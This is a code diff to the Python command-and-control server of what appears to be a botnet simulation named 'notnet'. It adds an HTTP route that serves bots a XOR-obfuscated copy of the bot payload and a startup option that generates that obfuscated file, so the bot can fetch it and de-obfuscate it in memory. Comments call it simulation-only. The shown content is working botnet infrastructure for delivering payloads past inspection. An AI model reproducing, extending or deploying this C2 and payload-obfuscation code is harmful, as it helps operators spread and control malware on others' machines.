@@ -612,6 +612,21 @@ def handle_http(conn, addr, c2):
                     log(f"PAYLOAD notnet download from {ip}")
                     c2.ev(f"C2 PAYLOAD download from {ip}")
                     continue
+                if path == "/bot/notnet.enc":
+                    # ISSUE #159 (SIMULATION-ONLY): XOR-obfuscated payload,
+                    # generated at startup from --payload-xor-key. The bot
+                    # de-XORs it in memory (obfuscation-grade, NOT
+                    # encryption). Served under the same secret/token auth
+                    # as every other /bot/ route above.
+                    enc_path = os.path.join(c2.payload_dir, "notnet.xor")
+                    if os.path.isfile(enc_path):
+                        http_send_file(conn, enc_path,
+                                       "application/octet-stream")
+                        log(f"PAYLOAD notnet.enc download from {ip}")
+                        c2.ev(f"C2 PAYLOAD download from {ip} (.enc)")
+                    else:
+                        log(f"PAYLOAD notnet.enc MISS from {ip} (no notnet.xor)")
+                    continue
                 if path == "/notnet-src.tar":
                     http_send_file(conn, os.path.join(c2.payload_dir, "notnet-src.tar"),
                                    "application/x-tar")
@@ -1301,6 +1316,12 @@ def main():
                     help="Bind address for the operator console (default 127.0.0.1). "
                          "Use 0.0.0.0 ONLY with --console-token set; otherwise we "
                          "refuse to expose an unauthenticated console (#136).")
+    ap.add_argument("--payload-xor-key",
+                    default=os.environ.get("NOTNET_PAYLOAD_XOR_KEY", ""),
+                    help="64-hex key. When set, XOR-obfuscates <payload_dir>/notnet "
+                         "into notnet.xor at startup and serves it at GET /bot/notnet.enc "
+                         "(#159, SIMULATION-ONLY: obfuscation-grade XOR stream, NOT "
+                         "encryption; the bot de-XORs in memory via payload_key_hex=).")
     args = ap.parse_args()
 
     # #136: never expose an unauthenticated console on a non-loopback bind.
@@ -1322,6 +1343,27 @@ def main():
 
     c2 = C2(args.secret, args.http_path, args.queue_dir, args.payload_dir, args.db,
             console_token=args.console_token)
+
+    # ISSUE #159 (SIMULATION-ONLY): payload XOR obfuscation. When
+    # --payload-xor-key is set, XOR <payload_dir>/notnet with the
+    # repeating key into notnet.xor, served at /bot/notnet.enc. Default
+    # (no key): nothing generated, /bot/notnet stays plaintext.
+    if args.payload_xor_key:
+        if not re.fullmatch(r"[0-9a-fA-F]{64}", args.payload_xor_key):
+            log("REFUSING --payload-xor-key: need exactly 64 hex chars")
+            sys.exit(2)
+        src = os.path.join(args.payload_dir, "notnet")
+        if os.path.isfile(src):
+            key = bytes.fromhex(args.payload_xor_key)
+            with open(src, "rb") as f:
+                data = f.read()
+            enc = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+            with open(os.path.join(args.payload_dir, "notnet.xor"), "wb") as f:
+                f.write(enc)
+            log(f"PAYLOAD-XOR wrote notnet.xor ({len(enc)} bytes) — "
+                "serving /bot/notnet.enc")
+        else:
+            log(f"PAYLOAD-XOR: no {src} — /bot/notnet.enc will MISS")
 
     threads = [
         threading.Thread(target=serve_http, args=(c2, args.http_port), daemon=True),
